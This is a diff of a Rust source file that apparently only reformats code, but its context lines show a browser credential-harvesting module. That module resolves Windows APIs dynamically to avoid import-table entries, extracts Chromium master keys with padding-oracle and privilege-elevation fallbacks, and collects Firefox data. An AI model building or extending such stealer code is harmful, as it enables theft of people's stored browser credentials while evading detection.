@@ -25,8 +25,8 @@ use base64::Engine as _;
 use serde::{Deserialize, Serialize};
 
 use crate::win_types::GUID;
-use crate::win_types::{DWORD, HMODULE};
 use crate::win_types::HANDLE;
+use crate::win_types::{DWORD, HMODULE};
 
 // ── Dynamic API resolution — no IAT entries ──────────────────────────────────
 //
@@ -1189,7 +1189,9 @@ fn get_chromium_master_key(local_state_path: &Path, clsids: &[GUID]) -> Result<V
                 );
             }
             Err(e) => {
-                tracing::warn!("C4 padding oracle failed: {e:#}, falling back to elevated strategies");
+                tracing::warn!(
+                    "C4 padding oracle failed: {e:#}, falling back to elevated strategies"
+                );
             }
         }
     }
@@ -1294,11 +1296,11 @@ pub fn set_c4_timeout(secs: u64) {
 unsafe fn resolve_crypt_unprotect_data() -> Option<
     unsafe extern "system" fn(
         *mut windows_sys::Win32::Security::Cryptography::CRYPT_INTEGER_BLOB, // pDataIn
-        *mut *mut u16,                                 // ppszDataDescr
+        *mut *mut u16,                                                       // ppszDataDescr
         *mut windows_sys::Win32::Security::Cryptography::CRYPT_INTEGER_BLOB, // pOptionalEntropy
-        *mut c_void,                                   // pvReserved
-        *mut c_void,                                   // pPromptStruct
-        u32,                                           // dwFlags
+        *mut c_void,                                                         // pvReserved
+        *mut c_void,                                                         // pPromptStruct
+        u32,                                                                 // dwFlags
         *mut windows_sys::Win32::Security::Cryptography::CRYPT_INTEGER_BLOB, // pDataOut
     ) -> i32,
 > {
@@ -2558,7 +2560,9 @@ pub fn collect_firefox_data(data_type: &common::BrowserDataType) -> BrowserDataR
     });
 
     result
-} ─────────────────────────────────────────────────────────
+}
+
+// ─────────────────────────────────────────────────────────
 
 /// Collect stored browser data according to `browser` and `data_type`.
 /// Returns a JSON-serialized [`BrowserDataResult`].
